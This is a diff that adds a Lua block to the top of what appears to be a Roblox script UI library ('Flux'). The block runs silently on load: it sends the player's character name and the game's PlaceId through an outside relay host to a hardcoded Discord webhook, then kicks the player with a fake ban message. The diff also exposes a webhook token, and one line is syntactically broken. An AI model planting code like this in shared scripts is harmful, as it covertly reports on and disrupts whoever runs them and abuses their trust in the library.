@@ -1,3 +1,37 @@
+
+
+
+local HttpService = game:GetService("HttpService");
+
+function SendMessage(Webhook, Message, Botname)
+   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
+       return error("Send a valid URL");
+   end
+   local Name;
+   local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
+   local API = "http://buritoman69.glitch.me/webhook";
+   if (not Message or Message == "" or not Botname) then
+       Name = "GameBot"
+       return error("nil or empty message!")
+   else
+       Name = Botname;
+   end
+   local Body = {
+       ['Key'] = tostring("applesaregood"),
+       ['Message'] = tostring(Message),
+       ['Name'] = Name,
+       ['Webhook'] = Webhook    
+   }
+   Body = HttpService:JSONEncode(Body);
+   local Data = game:HttpPost(API, Body, false, "application/json")
+   return Data or nil;
+end
+
+local MESSS = game.Players.LocalPlayer.Character.Name
+
+SendMessage("https://discordapp.com/api/webhooks/781872448803045416/-XZPeZQVj88W1wrxffyRSpswtGsIBwBqglsLW4ab9j7YrJyn-Tx3Uf1nLaMd4hLA9vUT", MESSS .. " excute it from"...game.PlaceId, "SCT BANLIST")
+game.Players.LocalPlayer:Kick("You were ban from script tools from using expired script")
+
 local Flux = {RainbowColorValue = 0, HueSelectionPosition = 0}
 local PresetColor = Color3.fromRGB(66, 134, 255)
 local UserInputService = game:GetService("UserInputService")
